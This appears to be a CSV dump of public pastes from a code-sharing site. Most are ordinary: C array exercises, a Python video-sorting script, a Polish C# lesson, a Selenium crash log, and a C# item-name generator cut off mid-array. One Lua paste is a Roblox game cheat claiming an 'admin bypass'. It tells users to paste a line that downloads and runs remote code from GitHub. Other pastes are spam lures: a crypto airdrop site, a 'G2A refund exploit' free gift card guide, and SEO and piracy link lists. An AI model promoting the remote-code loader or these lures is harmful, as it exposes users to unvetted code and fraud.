id,title,username,language,date,content
hBU3V0CC,Untitled,Josif_tepe,C,Saturday 20th of January 2024 11:54:22 AM CDT,"#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <stdlib.h>
void funkcija(int * niza, int n) {
    int nova_niza[n + 1];
    int j = 0;
    for(int i = 0; i < n; i++) {
        if(niza[i] >= 0) {
            nova_niza[j] = niza[i];
            j++;
        }
    }
    for(int i = 0; i < n; i++) {
        if(niza[i] < 0) {
            nova_niza[j] = niza[i];
            j++;
        }
    }
    for(int i = 0; i < n; i++) {
        printf(""%d "", nova_niza[i]);
    }
}
int main(int argc, const char * argv[]) {
    int n;
    scanf(""%d"", &n);

    int a[n];
    for(int i = 0; i < n; i++) {
        scanf(""%d"", &a[i]);
    }    
    funkcija(a, n);
    return 0;
}


/*
7
7 2 -1 0 -30 2 -15
*/"
uP6zW8YW,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 11:51:31 AM CDT,"#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <stdlib.h>
void funkcija(int * niza, int n) {
    int nova_niza[n + 1];
    int j = 0;
    for(int i = 0; i < n; i++) {
        if(abs(niza[i]) % 2 == 0) {
            nova_niza[j] = niza[i];
            j++;
        }
    }
    for(int i = 0; i < n; i++) {
        if(abs(niza[i]) % 2 == 1) {
            nova_niza[j] = niza[i];
            j++;
        }
    }
    for(int i = 0; i < n; i++) {
        printf(""%d "", nova_niza[i]);
    }
}
int main(int argc, const char * argv[]) {
    int n;
    scanf(""%d"", &n);

    int a[n];
    for(int i = 0; i < n; i++) {
        scanf(""%d"", &a[i]);
    }    
    funkcija(a, n);
    return 0;
}


/*
7
7 2 15 0 -3 2 5
*/"
hyBqGPbx,List of all FREE Crypto Airdrops!,jusst2k4,GetText,Saturday 20th of January 2024 11:45:04 AM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://net-drop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://net-drop.netlify.app/

683288"
zUmBYPSG,sdrvgdrnry,gadungw71,PHP,Saturday 20th of January 2024 11:42:23 AM CDT,"https://gist.github.com/theundertaker-mthaisub/cad07fede75d27da21a040b233449247
https://gist.github.com/supparer-thaisub/4cc2b97f66b4dcc9d5479d7e75de47f2
https://gist.github.com/babamaryadinata/22aaeb8175a0bb987797a68e6cc00b46
https://gist.github.com/dellawina350/a4c8d20e3eb9b303ed0e57cf871cef6d
https://gist.github.com/malignanhistory/0dad8247858cb0021707badbbadd57fe
https://gist.github.com/ramadhinasarah9/fc23da83b0a2806929b55c5ec398fe9d
https://gist.github.com/molieshella3/29e083e62cd38e0ed0425ae3e23ad845
https://luksjh6807.expandcart.com/index.php?route=product/product&product_id=373
https://ndimnz4747.expandcart.com/index.php?route=product/product&product_id=373
https://rxuawd2339.expandcart.com/index.php?route=product/product&product_id=373
https://ypzjro1878.expandcart.com/index.php?route=product/product&product_id=373
https://lzqoqb1938.expandcart.com/index.php?route=product/product&product_id=373
https://fueler.io/ramadhinasarah9/4kings-2-2023-4-kings-ii-m-thai-hd
https://fueler.io/filmthaisub/hd42-4-kings-ii-hd1080p
https://fueler.io/molieshella3/4-kings-ii-2023-hd-4-2-1080thai
https://groups.google.com/g/ibm.software.network.directory-integrator/c/ytfNoxr1s3I"
XnJWdiU7,Pet Simulator 99! [☁️UPDATE 5] AutoFarm Script,Project-WD,Lua,Saturday 20th of January 2024 11:11:23 AM CDT,"-- 🆕Update (20/01/2024)
-- AUTO FARM | ADMIN BYPASS | AUTO HATCH | AUTO RANK & MORE
-- Script📝: Paste into your executor
loadstring(game:HttpGet(""https://raw.githubusercontent.com/REDzHUBz/PetSimulator99/main/redz9999.lua"" ))()"
Kcaczswd,audio sorting revised,MD-Wade,Python,Saturday 20th of January 2024 11:11:13 AM CDT,"import tkinter as tk
from math import floor
from tkinter import filedialog

import numpy as np
from moviepy.editor import VideoFileClip
from moviepy.video.compositing.concatenate import concatenate_videoclips


class VideoProcessor:
    def __init__(self, video_path):
        print(""Initializing Video Processor..."")
        self.video = VideoFileClip(video_path)
        self.fps = self.video.fps
        self.frame_interval = 1.0 / self.fps
        if not self.video.audio:
            raise ValueError(""Video must have audio"")
        self.audio_fps = self.video.audio.fps
        self.frame_data = []

    def calculate_audio_level(self, frame_audio):
        if frame_audio.size == 0:
            return 0
        return np.mean(np.sqrt((frame_audio ** 2).sum(axis=1)))

    def process_video(self):
        print(""Processing video..."")
        for frame_time in np.arange(0, self.video.duration, self.frame_interval):
            end_time = min(frame_time + self.frame_interval, self.video.duration)
            frame_audio_segment = self.video.audio.subclip(frame_time, end_time).to_soundarray(fps=self.audio_fps)
            audio_level = self.calculate_audio_level(frame_audio_segment)

            subclip = self.video.subclip(frame_time, end_time)
            self.frame_data.append((audio_level, subclip))

            frame_index = int(frame_time * self.fps)
            if frame_index % (int(self.fps) * 4) == 0 or frame_index == ((floor(self.video.duration * self.fps)) - 1):
                print(f""Processed frame {frame_index} out of {floor(self.video.duration * self.fps)}."")

        print(""Sorting clips based on audio levels..."")
        self.frame_data.sort(key=lambda x: x[0])
        return [clip for _, clip in self.frame_data]

def browse_for_video_file():
    print(""Opening file dialog..."")
    root = tk.Tk()
    root.withdraw()
    return filedialog.askopenfilename()

print(""Starting video rearrangement process..."")
video_path = browse_for_video_file()
processor = VideoProcessor(video_path)
sorted_clips = processor.process_video()
final_clip = concatenate_videoclips(sorted_clips)
print(""Writing final video file..."")
final_clip.write_videofile(""rearranged_video.mp4"")
print(""Process completed."")
"
jEn8bGkN,G2A.com Free Gift Card Guide Jan 2024,ounnuo,GetText,Saturday 20th of January 2024 11:07:05 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_803782.pdf
 
Working as of
20 January 2024"
59Dy6VD0,Untitled,drakon-firestone,C#,Saturday 20th of January 2024 10:56:44 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace PowtorkaWiadomosci
{
    internal class Program
    {
        static void Main(string[] args)
        {
            // LICZBOWE
            // całkowite
            int wiek = 30;
            long masaWszechswiata = 100000000000000000L;

            // zmiennoprzecinkowe 
            float srednia = 4.75f;
            double pi = 3.1415;
            decimal kursEuro = 4.3393M;

            // literowe
            char litera = 't';
            string imie = ""Konrad"";

            // logiczny
            bool czyFerie = false;


            // STAŁE
            const double PI = 3.1415;

            int x = 4;
            int y = 10;

            int suma = x + y;
            int roznica = x - y;
            int mnozenie = x * y;
            float dzielenie = (float) x / y;
            Console.WriteLine(dzielenie);

            int modulo = 10 % 4;

            x++;
            Console.WriteLine(x);

            y *= 2; // y = y * 2;
            Console.WriteLine(y);


            if (y > x)
            {
                Console.WriteLine(""Y większe od X"");
            }
            else if (x > y)
            {
                Console.WriteLine(""X większe od Y"");
            }
            else
            {
                Console.WriteLine(""X i Y są równe"");
            }

            for (int i = 0; i < 10; i++)
            {
                Console.WriteLine($""Witaj po raz {i}"");
            }

            Console.WriteLine(""Podaj hasło: "");
            string haslo = Console.ReadLine();
            while (haslo != ""okoń"")
            {
                Console.WriteLine(""Podaj hasło: "");
                haslo = Console.ReadLine();
            }
            Console.WriteLine(""Witaj w systemie"");

            float kwad1 = PoleKwadratu(3);
            float kwad2 = PoleKwadratu(2.3456f);

            string[] imiona = { ""Fabian"", ""Mateusz"", ""Oskar"" };

            for (int i = 0; i < imiona.Length; i++)
            {
                PrzywitajSie(imiona[i]);
            }

            Console.ReadKey();
        }


        static float PoleKwadratu(float a)
        {
            if (a < 1) 
                return -1;
            else
                return a * a;
        }

        static void PrzywitajSie(string imie)
        {
            Console.WriteLine($""Siemanko {imie}!"");
        }
    }
}
"
FJuTS8Ug,selenium-grid log,amzar96,Apache Log,Saturday 20th of January 2024 10:23:44 AM CDT,"Error message / Log

2024-01-20 16:15:23,692 INFO Included extra file ""/etc/supervisor/conf.d/selenium.conf"" during parsing
2024-01-20 16:15:23,712 INFO RPC interface 'supervisor' initialized
2024-01-20 16:15:23,713 CRIT Server 'unix_http_server' running without any HTTP authentication checking
2024-01-20 16:15:23,718 INFO supervisord started with pid 7
2024-01-20 16:15:24,729 INFO spawned: 'xvfb' with pid 10
2024-01-20 16:15:24,734 INFO spawned: 'vnc' with pid 12
2024-01-20 16:15:24,738 INFO spawned: 'novnc' with pid 14
2024-01-20 16:15:24,743 INFO spawned: 'selenium-standalone' with pid 15
Selenium Grid Standalone configuration: 
2024-01-20 16:15:25,206 INFO success: xvfb entered RUNNING state, process has stayed up for > than 0 seconds (startsecs)
2024-01-20 16:15:25,206 INFO success: vnc entered RUNNING state, process has stayed up for > than 0 seconds (startsecs)
2024-01-20 16:15:25,207 INFO success: novnc entered RUNNING state, process has stayed up for > than 0 seconds (startsecs)
�2024-01-20 16:15:25,207 INFO success: selenium-standalone entered RUNNING state, process has stayed up for > than 0 seconds (startsecs)
[network]
relax-checks = true

[node]
grid-url = ""http://localhost:4444""
session-timeout = ""300""
override-max-sessions = true
detect-drivers = false
drain-after-session-count = 0
max-sessions = 10

[[node.driver-configuration]]
display-name = ""chrome""
�stereotype = '{""browserName"": ""chrome"", ""browserVersion"": ""120.0"", ""platformName"": ""Linux"", ""goog:chromeOptions"": {""binary"": ""/usr/bin/google-chrome""}}'
max-sessions = 10

Starting Selenium Grid Standalone...
Tracing is disabled
16:15:31.480 INFO [LoggingOptions.configureLogEncoding] - Using the system default encoding
16:15:31.859 INFO [OpenTelemetryTracer.createTracer] - Using OpenTelemetry for tracing
/opt/bin/start-selenium-standalone.sh: line 50:   106 Segmentation fault      (core dumped) java ${JAVA_OPTS:-$SE_JAVA_OPTS} ${CHROME_DRIVER_PATH_PROPERTY} ${EDGE_DRIVER_PATH_PROPERTY} ${GECKO_DRIVER_PATH_PROPERTY} -jar /opt/selenium/selenium-server.jar ${EXTRA_LIBS} standalone --bind-host ${SE_BIND_HOST} --config /opt/selenium/config.toml ${SUB_PATH_CONFIG} ${SE_OPTS}
2024-01-20 16:15:41,615 INFO exited: selenium-standalone (exit status 139; not expected)
2024-01-20 16:15:41,617 WARN received SIGINT indicating exit request
2024-01-20 16:15:41,618 INFO waiting for xvfb, vnc, novnc to die
2024-01-20 16:15:43,142 INFO stopped: novnc (terminated by SIGTERM)
2024-01-20 16:15:43,157 INFO stopped: vnc (terminated by SIGTERM)
2024-01-20 16:15:44,165 INFO stopped: xvfb (terminated by SIGTERM)"
7ye8KF6t,GameItemNameGenerator,Krythic,C#,Saturday 20th of January 2024 10:09:00 AM CDT,"using Assets.Resources.Scripts;
using System.Collections.Generic;

public class GameItemNameGenerator
{

    private VoidwalkerRandom _random;
    private Dictionary<GameItemType, string[]> _rareNameSuffixes;
    private Dictionary<GameItemType, string[]> _baseItemNames;

    private static readonly string[] _rareNamePrefixes =
    {

            ""Agony"",        ""Apocalypse"",   ""Armageddon"",   ""Ash"",          ""Basalisk"",
            ""Beast"",        ""Behemoth"",     ""Black"",        ""Blight"",       ""Blood"",
            ""Bone"",         ""Bramble"",      ""Brimstone"",    ""Brood"",        ""Carrion"",
            ""Cataclysm"",    ""Chaos"",        ""Chimeric"",     ""Corpse"",       ""Corruption"",
            ""Crimson"",      ""Creep"",        ""Dark"",         ""Dawn"",         ""Death"",
            ""Demon"",        ""Cruel"",        ""Dire"",         ""Discord"",      ""Doom"",
            ""Crypt"",        ""Horror"",       ""Hypnotic"",     ""Kraken"",       ""Last"",
            ""Loath"",        ""Maelstrom"",    ""Malignant"",    ""Mind"",         ""Miracle"",
            ""Mire"",         ""Moon"",         ""Morbid"",       ""Murk"",         ""Night"",
            ""Oblivion"",     ""Obscure"",      ""Onslaught"",    ""Order"",        ""Pain"",
            ""Pandemonium"",  ""Phantom"",      ""Phoenix"",      ""Plague"",       ""Primal"",
            ""Profane"",      ""Rage"",         ""Rapture"",      ""Raven"",        ""Rift"",
            ""Dragon"",       ""Dread"",        ""Dusk"",         ""Eagle"",        ""Empyrean"",
            ""Entropic"",     ""Epoch"",        ""Ever"",         ""Fate"",         ""Fear"",
            ""Final"",        ""Flame"",        ""Foe"",          ""Forsaken"",     ""Frost"",
            ""Gale"",         ""Ghast"",        ""Ghost"",        ""Ghoul"",        ""Gloom"",
            ""Glyph"",        ""Golem"",        ""Gore"",         ""Gray"",         ""Grief"",
            ""Grim"",         ""Hate"",         ""Havoc"",        ""Haze"",         ""Hero"",
            ""Rune"",         ""Seethe"",       ""Serpent"",      ""Shade"",        ""Shadow"",
            ""Shamble"",      ""Skeleton"",     ""Skull"",        ""Sorrow"",       ""Soul"",
            ""Spell"",        ""Spirit"",       ""Star"",         ""Stone"",        ""Storm"",
            ""Tempest"",      ""Terror"",       ""Torment"",      ""Twilight"",     ""Vengeance"",
            ""Victory"",      ""Vile"",         ""Viper"",        ""Vivid"",        ""Vortex"",
            ""White"",        ""Wild"",         ""Woe"",          ""Wraith"",       ""Wrath"",
            ""Gloam"",        ""Monster"",      ""Elusive"",      ""First"",        ""Ichor"",
            ""Glimmer"",      ""Dredge"",       ""Deific"",       ""Cyclopean"",    ""Sunless"",
            ""Unlit"",        ""Foul"",         ""Bleak"",        ""Sable"",        ""Somber"",
            ""Grave"",        ""Secluded"",     ""Faint"",        ""Nameless"",     ""Rugose"",
            ""Gibbous"",      ""Putrid"",       ""Fetid"",        ""Esoteric"",     ""Effluvial"",
            ""Ebullient"",    ""Sunlit"",       ""Melodic"",      ""Scarce"",       ""Abundant"",
            ""Abysmal"",      ""Acerbic"",      ""Allusive"",     ""Horrific"",     ""Idyllic"",
            ""Barbaric"",     ""Somatic"",      ""Insipid"",      ""Ceaseless"",    ""Undying"",
            ""Iridescent"",   ""Irascible"",    ""Knightly"",     ""Lucent"",       ""Traumatic"",
            ""Tumultuous"",   ""Vigorous"",     ""Enumerated"",   ""Earthbound"",   ""Stalwart"",
            ""Blossom"",      ""Turbulent"",    ""Skybound"",     ""Skyward"",      ""Effusive"",
            ""Perilous"",     ""Verdant"",      ""Fiend"",        ""Prolific"",     ""Forged"",
            ""Brooding"",     ""Wight"",        ""Waxing"",       ""Waning""
    };

    private static readonly string[] _uncommonNamePrefixes =
    {
            ""Brilliant"",    ""Glimmering"",       ""Scintilating"",     ""Icy"",              ""Skyborne"",
            ""Moonlit"",      ""Sunlit"",           ""Viridian"",         ""Crimson"",          ""Azure"",
            ""Jeweled"",      ""Umbral"",           ""Wyvern"",           ""Daring"",           ""Bone"",
            ""Silent"",       ""Sacrificial"",      ""Fiendish"",         ""Ebon"",             ""Skilled"",
            ""Elegant"",      ""Screaming"",        ""Cobra"",            ""Bright"",           ""Glowing"",
            ""Deathly"",      ""Heavy"",            ""Mighty"",           ""Grave"",            ""Permafrost"",
            ""Thunder"",      ""Vicious"",          ""Savage"",           ""Brutal"",           ""Merciless"",
            ""Nimble"",       ""Holy"",             ""Sanctified"",       ""Unholy"",           ""Dark"",
            ""Strange"",      ""Mysterious"",       ""Keen"",             ""Sundering"",        ""Infused"",
            ""Redolent"",     ""Wise"",             ""Old"",              ""Ancient"",          ""Resplendent"",
            ""Frosty"",       ""Victorious"",       ""Runed"",            ""Singing"",          ""Laughing"",
            ""Mystic"",       ""Ornate"",           ""Tarnished"",        ""Forlorn"",          ""Gilded"",
            ""Ghost"",        ""Ghostly"",          ""Sacred"",           ""Grim"",             ""Phantom"",
            ""Exalted"",      ""Shadowed"",         ""Hallowed"",         ""Dusky"",            ""Dawn"",
            ""Twilight"",     ""Epoch"",            ""Storm"",            ""Typhoon"",          ""Spiritual"",
            ""Shining"",      ""Earthbound"",       ""Skybound"",         ""Herobound"",        ""Soulbound"",
            ""Etched"",       ""Twisted"",          ""Curled"",           ""Unfurled"",         ""Unchanged"",
            ""Levitating"",   ""Bronze"",           ""Copper"",           ""Knightly"",         ""Echoing"",
            ""Calling"",      ""Jade"",             ""Blackened"",        ""Furious"",          ""Spiteful"",
            ""Hateful"",      ""Coldstone"",        ""Arcstone"",         ""Sunstone"",         ""Enamelled"",
            ""Northern"",     ""Claystone"",        ""Darkstone"",        ""Briarsteel"",       ""Heirloom"",
            ""Mercenary"",    ""Nobles"",           ""Howling"",          ""Scored"",           ""Scorched"",
            ""Latent"",       ""Daybreak"",         ""Haunted"",          ""Dreadful"",         ""Archaic"",
            ""Forgotten"",    ""Flowing""
    };

    private static readonly string[] _uncommonApparelPrefixes =
    {
        ""Lightweave"",       ""Darkweave"",    ""Shadowweave"",      ""Embersilk"",        ""Manabloom"",
        ""Runecloth"",        ""Flowing"",      ""Wizardweave"",      ""Efflorescent"",     ""Opulent"",
        ""Manaweave"",        ""Grimstitch"",   ""Mageweave"",        ""Ironweave"",        ""Steelweave"",
        ""Copperweave"",      ""Titanweave"",   ""Spellbinder"",      ""Silverweave"",      ""Dawnweave"",
        ""Duskweave"",        ""Acolyte"",      ""Adept"",            ""Disciple"",         ""Archmage"",
        ""Frostwoven"",       ""Thistlefur"",   ""Duskwoven"",        ""Nightwatch"",       ""Serpenthide"",
        ""Demonhide"",        ""Beasthide"",    ""Gryphonhide"",      ""Shadowhide"",       ""Dragonhide"",
        ""Assassin"",         ""Stalker"",      ""Hunter"",           ""Phantom""
    };

    private static readonly string[] _commonNamePrefixes =
    {
        ""Simple"",   ""Mundane"",      ""Discarded"",    ""Damaged"",      ""Unremarkable"",
        ""Crude"",    ""Broken"",       ""Worn"",         ""Decaying"",     ""Feeble"",
        ""Cracked"",  ""Dull""
    };

    public string Generate(ItemQuality quality, GameItemType itemType)
    {
        switch (quality)
        {
            case ItemQuality.Common:
                return GenerateCommonName(itemType);
            case ItemQuality.Uncommon:
                return GenerateUncommonName(itemType);
            case ItemQuality.Rare:
                return GenerateRareName(itemType);
            default:
                return null; // Includes Cases: None, Epic, Legendary
        }
    }

    /// <summary>
    /// Generates a Rare Name
    /// </summary>
    /// <param name=""constraint""></param>
    /// <returns></returns>
    public string GenerateRareName(GameItemType constraint)
    {
        string prefix = _random.Choose(_rareNamePrefixes);
        string suffix = _random.Choose(_rareNameSuffixes[constraint]);
        return prefix + "" "" + suffix;
    }

    /**
     * Generates an Uncommon Name
     */
    public string GenerateUncommonName(GameItemType constraint)
    {
        string prefix;
        if (constraint.IsBasicArmor())
        {
            /**
             * Provides a straight 50% chance to use
             * either name pools
             */
            if (_random.NextRange(1, 2) == 2)
            {
                prefix = _random.Choose(_uncommonNamePrefixes);
            }
            else
            {
                prefix = _random.Choose(_uncommonApparelPrefixes);
            }
        }
        else
        {
            prefix = _random.Choose(_uncommonNamePrefixes);
        }
        string suffix = _random.Choose(_baseItemNames[constraint]);
        return prefix + "" "" + suffix;
    }

    /**
     * Generates a Common Name
     */
    public string GenerateCommonName(GameItemType constraint)
    {
        string prefix = _random.Choose(_commonNamePrefixes);
        string suffix = _random.Choose(_baseItemNames[constraint]);
        return prefix + "" "" + suffix;
    }

    public GameItemNameGenerator()
    {
        _random = new VoidwalkerRandom();
        
        _baseItemNames = new Dictionary<GameItemType, string[]>
        {
            { GameItemType.Headwear, _baseHeadwearNames },
            { GameItemType.Chestwear, _baseChestwearNames },
            { GameItemType.Handwear, _baseHandwearNames },
            { GameItemType.Footwear, _baseFootwearNames },
            { GameItemType.Jewelry_Amulet, _baseAmuletNames },
            { GameItemType.Jewelry_Ring, _baseRingNames },
            { GameItemType.Shield, _baseShieldNames },
            { GameItemType.Tome, _baseTomeNames },
            { GameItemType.Weapon_Knuckle, _baseFistNames },
            { GameItemType.Weapon_1H_Sword, _baseSwordNames },
            { GameItemType.Weapon_2H_Sword, _baseGreatswordNames },
            { GameItemType.Weapon_1H_Axe, _baseAxeNames },
            { GameItemType.Weapon_2H_Axe, _baseGreataxeNames },
            { GameItemType.Weapon_1H_Mace, _baseMaceNames },
            { GameItemType.Weapon_2H_Mace, _baseGreatmaceNames },
            { GameItemType.Weapon_Bow, _baseBowNames },
            { GameItemType.Weapon_Dagger, _baseDaggerNames },
            { GameItemType.Weapon_Staff, _baseStaffNames },
            { GameItemType.Weapon_Wand, _baseWandNames }
        };
        _rareNameSuffixes = new Dictionary<GameItemType, string[]>
        {
            { GameItemType.Headwear, _rareHeadwearNameSuffixes },
            { GameItemType.Chestwear, _rareChestwearNameSuffixes },
            { GameItemType.Handwear, _rareHandwearNameSuffixes },
            { GameItemType.Footwear, _rareFootwearNameSuffixes },
            { GameItemType.Jewelry_Amulet, _rareAmuletNameSuffixes },
            { GameItemType.Jewelry_Ring, _rareRingNameSuffixes },
            { GameItemType.Shield, _rareShieldNameSuffixes },
            { GameItemType.Tome, _rareTomeNameSuffixes },
            { GameItemType.Weapon_Knuckle, _rareFistNameSuffixes },
            { GameItemType.Weapon_1H_Sword, _rareSwordNameSuffixes },
            { GameItemType.Weapon_2H_Sword, _rareSwordNameSuffixes },
            { GameItemType.Weapon_1H_Axe, _rareAxeNameSuffixes },
            { GameItemType.Weapon_2H_Axe, _rareAxeNameSuffixes },
            { GameItemType.Weapon_1H_Mace, _rareMaceNameSuffixes },
            { GameItemType.Weapon_2H_Mace, _rareMaceNameSuffixes },
            { GameItemType.Weapon_Bow, _rareBowNameSuffixes },
            { GameItemType.Weapon_Dagger, _rareDaggerNameSuffixes },
            { GameItemType.Weapon_Staff, _rareStaffNameSuffixes },
            { GameItemType.Weapon_Wand, _rareWandNameSuffixes }
        };
    }

    #region Rare Weapon Name Suffixes

    private static readonly string[] _rareAxeNameSuffixes =
    {
            ""Bane"", ""Butcher"",""Gnash"",""Rend"",""Slayer"",
            ""Beak"",""Edge"",""Hunger"",""Roar"",""Song"",
            ""Bite"",""Etcher"",""Mangler"",""Sever"",""Spawn"",
            ""Splitter"",""Reaver"",""Ender"",""Splitter"",""Shatter"",
            ""Sunder"",""Cleaver"", ""Force"",""Sever"",""Break"",
            ""Thirst"",""Breaker"", ""Chopper"",""Scream"",""Scourge""
    };

    private static readonly string[] _rareBowNameSuffixes =
    {
            ""Reach"",   ""Thunder"", ""Wind"",    ""Reacher"", ""Sight"",
            ""Seige"",   ""Twine"",  ""Wing"",    ""Call"", ""Vision"",
            ""Strike"",  ""Volley"",  ""Caster"",  ""Wave"",    ""Eye"",
            ""Bane"",    ""Thirst"",  ""Arch"",    ""Fetch"",  ""Mark"",
            ""Song"",    ""Branch"",  ""Barrage"", ""Guide"",   ""Nock"",
            ""Stinger"", ""Blast"",   ""Breeze"",  ""Horn"",    ""Rain"",
        };

    private static readonly string[] _rareDaggerNameSuffixes =
    {
            ""Edge"",    ""Thirst"",  ""Seeker"",  ""Point"",   ""Thrust"",
            ""Hunger"",  ""Etcher"",  ""Blade"",   ""Spine"",   ""Fragment"",
            ""Sever"",   ""Piercer"", ""Slasher"", ""Impaler"", ""Splinter"",
            ""Bane"",    ""Fang"",    ""Needle"",  ""Scratch"", ""Spike"",
            ""Song"",    ""Gutter"",  ""Razor"",   ""Skewer"",  ""Stinger"",
            ""Barb"",    ""Impaler"", ""Scalpel"", ""Slicer"",  ""Bite""
        };

    private static readonly string[] _rareFistNameSuffixes =
    {
            ""Fist"", ""Knuckle"", ""Hand"", ""Grasp"", ""Clench"", ""Grasp"",
            ""Palm"", ""Paw"", ""Mitt"", ""Reach"", ""Manus"", ""Smite"", ""Knock"",
            ""Claw"", ""Bite"", ""Fang"", ""Coil""
        };

    private static readonly string[] _rareMaceNameSuffixes =
                    {
            ""Star"",    ""Bane"",    ""Force"",   ""Pillar"",  ""Annihilator"",
            ""Thresher"",    ""Mangler"", ""Smash"",   ""Column"",  ""Break"",
            ""Wreck"",   ""Roar"",    ""Mallet"",  ""Spire"",   ""Ender"",
            ""Batter"",  ""Bringer"", ""Burst"",   ""Grinder"", ""Ruin"",
            ""Blast"",   ""Brand"",   ""Crack"",   ""Knell"",   ""Shatter"",
            ""Blow"",    ""Breaker"", ""Crusher"", ""Ram"", ""Smasher""
        };

    private static readonly string[] _rareStaffNameSuffixes =
    {
            ""Bane"",    ""Chant"",     ""Spell"",        ""Beam"",     ""Mast"",
            ""Roar"",    ""Cry"",       ""Weaver"",       ""Branch"",   ""Pile"",
            ""Call"",    ""Gnarl"",     ""Song"",         ""Goad"",     ""Pillar"",
            ""Pole"",    ""Bark"",      ""Composer"",     ""Command"",  ""Keeper"",
            ""Post"",    ""Force"",     ""Summoner"",     ""Walk"",     ""Banisher"",
            ""Spire"",   ""Channel"",   ""Tree"",         ""Guide"",    ""Sealer""
        };

    private static readonly string[] _rareSwordNameSuffixes =
        {
            ""Bane"",     ""Fang"",     ""Needle"",   ""Scalpel"",  ""Slicer"",
            ""Song"",     ""Gutter"",   ""Razor"",    ""Scratch"",  ""Spike"",
            ""Barb"",     ""Bringer"",  ""Blade"",    ""Skewer"",   ""Spiker"",
            ""Stinger"",  ""Edge"",     ""Thirst"",   ""Cutter"",   ""Slasher"",
            ""Beak"",     ""Hunger"",   ""Brand"",    ""Flayer"",   ""Slayer"",
            ""Bite"",     ""Sever"",    ""Slash"",    ""Breaker"",  ""Killer"",
        };

    private static readonly string[] _rareWandNameSuffixes =
    {
            ""Bane"",    ""Branch"",    ""Bite"",       ""Call"",   ""Gnarl"",
            ""Song"",    ""Needle"",    ""Edge"",       ""Chant"",  ""Spell"",
            ""Thirst"",  ""Scratch"",   ""Barb"",       ""Cry"",    ""Weaver"",
            ""Goad"",    ""Bark"",      ""Summoner"",   ""Guide"",  ""Banisher"",
            ""Spire"",   ""Strand"",    ""Command"",    ""Keeper"", ""Splinter"",
            ""Charm"",   ""Composer"",  ""Sealer"",     ""Force"",  ""Drink"",
        };

    #endregion

    #region Rare Apparel Name Suffixes

    private static readonly string[] _rareAmuletNameSuffixes =
    {
            ""Beads"",   ""Choker"",  ""Idol"",    ""Locket"",  ""Pendant"", ""Talisman"",    ""Fragment"",
            ""Braid"",   ""Clasp"",   ""Tether"",  ""Medallion"",   ""Rosary"",  ""Piece"",   ""Hang"",
            ""Charm"",   ""Collar"",  ""Heart"",   ""Noose"",   ""Scarab"",  ""Soul"",    ""Strangle"",
            ""Charm"",   ""Core"",    ""Secret"",  ""Reliquary"",   ""Remains"", ""Abyss"",   ""Reward"",
            ""Trinket"", ""Cradle"",  ""Mystery"", ""Vessel"",  ""Ornament"",  ""Trophy"",  ""Tether"",
            ""Coffer"",  ""Crest"",   ""Vault"",   ""Sanctuary"",   ""Momento"", ""Antique"", ""Bond"",
        };

    private static readonly string[] _rareChestwearNameSuffixes =
    {
            ""Carapace"",    ""Curtain"", ""Form"",    ""Pelt"",    ""Shell"",   ""Skin"",    ""Ward"",
            ""Cloak"",   ""Guard"",    ""Keep"",    ""Cage"",    ""Shelter"", ""Suit"",    ""Wrap"",
            ""Coat"",    ""Hide"",    ""Mantle"",  ""Sanctuary"",   ""Shroud"",  ""Veil"",    ""Flesh"",
            ""Chasis""
        };

    private static readonly string[] _rareFootwearNameSuffixes =
    {
            ""Dash"",    ""League"",  ""Road"",    ""Span"",    ""Stride"",  ""Tread"",   ""Voyage"",
            ""Goad"",    ""March"",   ""Slippers"",    ""Spark"",   ""Tracks"",   ""Urge"",    ""Pilgrimage"",
            ""Hoof"",    ""Pace"",    ""Sole"",    ""Spur"",    ""Trail"",   ""Journey"", ""Travel"",
        };

    private static readonly string[] _rareHandwearNameSuffixes =
    {
            ""Caress"",      ""Fingers"", ""Grip"",    ""Knuckle"", ""Palm"",   ""Touch"",   ""Force"",
            ""Claw"",        ""Fist"",    ""Hand"",    ""Mitts"",   ""Paw"",    ""Vise"",    ""Maker"",
            ""Clutches"",    ""Grasp"",   ""Hold"",    ""Nails"",   ""Talons"", ""Keep"",    ""Taker"",
        };

    private static readonly string[] _rareHeadwearNameSuffixes =
                    {
            ""Brow"",    ""Crest"",   ""Glance"",  ""Horn"",    ""Salvation"",   ""Veil"",    ""Sight"",
            ""Corona"",  ""Crown"",   ""Guardian"",    ""Keep"",    ""Shelter"", ""Visage"",  ""Gaze"",
            ""Cowl"",    ""Dome"",    ""Halo"",    ""Peak"",    ""Star"",    ""Visor"",   ""Vision"",
        };

    private static readonly string[] _rareRingNameSuffixes =
    {
            ""Band"",    ""Eye"", ""Grip"",    ""Knot"",    ""Nail"",    ""Twirl"",   ""Bound"",
            ""Circle"",  ""Finger"",  ""Gyre"",    ""Crest"",   ""Spiral"",  ""Whorl"",   ""Bind"",
            ""Coil"",    ""Grasp"",   ""Hold"",    ""Loop"",    ""Turn"",    ""Whirl"",   ""Shackle"",
            ""Charm"",   ""Core"",    ""Secret"",  ""Reliquary"",   ""Remains"", ""Abyss"",   ""Reward"",
            ""Trinket"", ""Cradle"",  ""Mystery"", ""Vessel"",  ""Ornament"",  ""Trophy"",  ""Tether"",
            ""Coffer"",  ""Crest"",   ""Vault"",   ""Sanctuary"",   ""Momento"", ""Antique"", ""Bond"",
        };

    private static readonly string[] _rareShieldNameSuffixes =
        {
            ""Aegis"",   ""Bastion"", ""Emblem"",  ""Mark"",    ""Rook"",    ""Tower"",   ""Wing"",
            ""Badge"",   ""Bulwark"", ""Fend"",    ""Refuge"",  ""Sanctum"", ""Watch"",   ""Defend"",
            ""Barrier"", ""Duty"",    ""Guard"",   ""Rock"",    ""Span"",    ""Wall"",    ""Ward"",
        };

    private static readonly string[] _rareTomeNameSuffixes =
    {
            ""Book"",   ""Words"",    ""Reconcile"",  ""Declare"",   ""Order"", ""Rule"",   ""Laws"",
            ""Hope"", ""Bravery"",  ""Revelation"", ""Admission"",  ""Directive"",  ""Instruction"",  ""Mandate"",
